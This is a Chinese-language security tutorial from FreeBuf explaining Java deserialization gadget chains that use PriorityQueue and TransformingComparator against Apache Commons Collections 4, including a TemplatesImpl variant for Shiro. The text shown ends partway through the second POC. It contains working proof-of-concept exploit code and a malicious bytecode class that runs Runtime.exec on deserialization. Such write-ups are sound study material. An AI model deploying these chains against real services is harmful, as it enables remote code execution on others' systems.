---
title: Java 利用PriorityQueue进行无InvokerTransformer反序列化
url: https://www.freebuf.com/vuls/351788.html
source: FreeBuf网络安全行业门户
date: 2022-12-08
fetch_date: 2025-10-04T00:53:20.319724
---

# Java 利用PriorityQueue进行无InvokerTransformer反序列化

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

Java 利用PriorityQueue进行无InvokerTransformer反序列化

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

Java 利用PriorityQueue进行无InvokerTransformer反序列化

2022-12-07 15:56:22

所属地 四川省

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

# java\_PriorityQueue

`java.util.PriorityQueue` 是一个优先队列（Queue），节点之间按照优先级大小排序成一棵树。其中PriorityQueue有自己的readObject反序列化入口。

反序列化链为：`PriorityQueue#readObject`->`heapify()`->`siftDown()`->`siftDownUsingComparator()`->`comparator.compare()`。当comparator为TransformingComparator对象时，能触发transform()方法：

![image-20221206160559047.png](https://image.3001.net/images/20221207/1670398346_6390418ae2144f6f8f095.png!small)

至于PriorityQueue的`heapify()、siftDown()、siftDownUsingComparator()`的用处就是恢复排序、节点下移和比较元素大小。而Comparator则是定义了两个对象用什么方式比较

## CC2TransformingComparator

结合CC2的利用方式，就是向TransformingComparator传入恶意Transformer。

```
Comparator comparator = new TransformingComparator(transformerChain);
```

再用priorityQueue触发comparator:

```
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(2);
```

可以add任何非null对象，因为触发transform与队列参数无关（比较的是1,2，比较方式为comparator.compare()）

* POC：

```
package org.example;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
public class CC2TransformingComparator {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class,
                        Object[].class }, new Object[] { null, new
                        Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class
                },
                        new String[] { "calc.exe" }),
        };
        Transformer transformerChain = new
                ChainedTransformer(fakeTransformers);
        Comparator comparator = new
                TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(transformerChain, "iTransformers", transformers);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

测试结果：

![image-20221206161847500.png](https://image.3001.net/images/20221207/1670398362_6390419aa0da1b1dc00ce.png!small)

## TemplatesImpl无数组TransformingComparator

用TemplatesImpl字节码的方式也能进行利用，并且还能用于shiro的无数组链：

同样的向TransformingComparator传入恶意Transformer，这次传的是InvokerTransformer，而非transformerChain数组

```
Comparator comparator = new TransformingComparator(transformer);
```

触发comparator的方式还是实例化PriorityQueue对象

```
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(obj);
queue.add(obj);
```

为什么要传TemplatesImpl的对象obj呢？回想在没有ConstantTransformer初始化对象的情况下，shiro反序列化是依靠TiedMapEntry的构造函数把初始化对象传入key

![image-20221206164448132.png](https://image.3001.net/images/20221207/1670398369_639041a148a6a460f03d4.png!small)

TiedMapEntry的hashcode调用了getValue，getValue触发lazyMap.get()

![image-20221206164623593.png](https://image.3001.net/images/20221207/1670398373_639041a5c20e50e8e97d4.png!small)

但是在使用PriorityQueue类时，就无法用到shiro的入口HashMap，自然整条链都用不了。进入templatesImpl对象的newTransformer()入口的方式变为:

`PriorityQueue#Compare()`->`TransformingComparator#transform`->`InvokerTransformer`->`TemplatesImpl#newTransformer()`

只需要compare()时对象为恶意InvokerTransformer

![image-20221206160559047.png](https://image.3001.net/images/20221207/1670398389_639041b55410d3a5d37fb.png!small)

恶意字节码类：

```
package evil;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesImpl extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public EvilTemplatesImpl() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

POC:

```
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class ShiroTransformingComparator {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    protected static byte[] getBytescode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
        return clazz.toBytecode();
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{getBytescode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setField...